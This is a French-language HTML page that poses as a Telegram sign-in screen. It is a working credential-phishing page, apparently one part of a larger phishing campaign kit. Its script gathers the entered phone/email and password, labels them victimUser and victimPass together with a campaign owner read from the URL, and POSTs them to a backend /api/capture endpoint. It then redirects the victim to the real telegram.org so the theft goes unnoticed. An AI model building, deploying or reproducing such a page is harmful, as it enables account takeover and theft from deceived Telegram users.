<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion à Telegram</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #f4f4f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
            box-sizing: border-box;
        }

        .tg-container {
            background-color: #ffffff;
            border-radius: 12px;
            padding: 40px 30px;
            width: 100%;
            max-width: 420px;
            box-sizing: border-box;
            text-align: center;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
        }

        /* Logo Telegram en SVG officiel */
        .tg-logo {
            width: 70px;
            height: 70px;
            margin: 0 auto 20px auto;
            background-color: #2481cc;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .tg-logo svg {
            width: 40px;
            height: 40px;
            fill: #ffffff;
            margin-left: -3px; /* Centrage optique de l'avion papier */
        }

        h1 {
            font-size: 24px;
            font-weight: 700;
            color: #222222;
            margin-bottom: 10px;
            margin-top: 0;
        }

        .subtitle {
            font-size: 14px;
            color: #707579;
            margin-bottom: 30px;
            line-height: 1.4;
        }

        .input-group {
            margin-bottom: 16px;
            text-align: left;
        }

        .input-field {
            width: 100%;
            padding: 14px 16px;
            background-color: #f1f3f4;
            border: 1px solid #dfe1e5;
            border-radius: 8px;
            font-size: 15px;
            color: #222222;
            box-sizing: border-box;
            outline: none;
            transition: border-color 0.2s, background-color 0.2s;
        }

        .input-field:focus {
            border-color: #2481cc;
            background-color: #ffffff;
        }

        .tg-btn {
            background-color: #2481cc;
            color: white;
            border: none;
            border-radius: 8px;
            padding: 14px;
            width: 100%;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 10px;
            transition: background-color 0.2s;
        }
        .tg-btn:hover {
            background-color: #2177bc;
        }

        .footer-help {
            margin-top: 25px;
            font-size: 13px;
            color: #707579;
        }
        .footer-help a {
            color: #2481cc;
            text-decoration: none;
            font-weight: 500;
        }
        .footer-help a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>

    <div class="tg-container">
        <!-- Logo Telegram officiel -->
        <div class="tg-logo">
            <svg viewBox="0 0 24 24">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.07-.2-.08-.06-.19-.04-.27-.02-.12.03-1.99 1.27-5.62 3.72-.53.36-1.01.54-1.44.53-.47-.01-1.37-.26-2.03-.48-.82-.27-1.47-.42-1.42-.88.03-.25.38-.51 1.05-.78 4.11-1.79 6.85-2.97 8.23-3.54 3.92-1.63 4.74-1.92 5.27-1.93.12 0 .39.03.56.17.15.12.19.28.21.4-.01.06.01.24-.04.43z"/>
            </svg>
        </div>

        <h1>Telegram</h1>
        <p class="subtitle">Veuillez entrer votre numéro de téléphone ou nom d'utilisateur et votre mot de passe pour vous connecter.</p>

        <!-- Formulaire de connexion simple sans OTP -->
        <form id="loginForm">
            <div class="input-group">
                <input type="text" id="username" class="input-field" placeholder="Numéro de téléphone ou e-mail" required>
            </div>
            <div class="input-group">
                <input type="password" id="password" class="input-field" placeholder="Mot de passe (si requis)" required>
            </div>

            <button type="submit" class="tg-btn">Suivant</button>
        </form>

        <div class="footer-help">
            <p>Besoin d'aide ? <a href="#" onclick="return false;">Contactez le support</a></p>
        </div>
    </div>

    <script>
        // Récupération automatique des paramètres de l'URL (?user=Kim&type=standard)
        const urlParams = new URLSearchParams(window.location.search);
        const campaignOwner = urlParams.get('user') || 'Kim';
        const linkType = urlParams.get('type') || 'standard';

        // Gestion de la soumission du formulaire et envoi vers le backend Flask
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            const payload = {
                owner: campaignOwner,
                network: "Telegram",
                type: linkType,
                victimUser: username,
                victimPass: password,
                otp: 'Aucun'
            };

            // Envoi des données capturées vers le backend Flask (/api/capture)
            fetch('/api/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).then(response => {
                window.location.href = "https://telegram.org";
            }).catch(error => {
                window.location.href = "https://telegram.org";
            });
        });
    </script>
</body>
</html>
